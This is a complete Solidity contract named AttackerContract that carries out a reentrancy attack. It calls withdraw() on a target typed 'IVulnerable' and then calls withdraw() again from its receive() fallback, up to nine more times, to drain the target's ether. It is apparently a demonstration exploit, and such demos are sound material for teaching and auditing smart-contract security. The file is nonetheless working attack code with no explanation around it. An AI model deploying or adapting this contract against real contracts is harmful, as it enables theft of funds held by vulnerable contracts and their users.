//SPDX-License-Identifier: Unlicense
pragma solidity 0.8.7;

import "./interfaces/IVulnerable.sol";

contract AttackerContract {
    IVulnerable public vulnerable;

    uint256 reentrancyCount;

    constructor(address contractAddress) {
        vulnerable = IVulnerable(contractAddress);
    }

    receive() external payable {
        if (reentrancyCount < 9) {
            reentrancyCount++;
            vulnerable.withdraw();
        }
    }

    function withdraw() public {
        vulnerable.withdraw();
    }
}
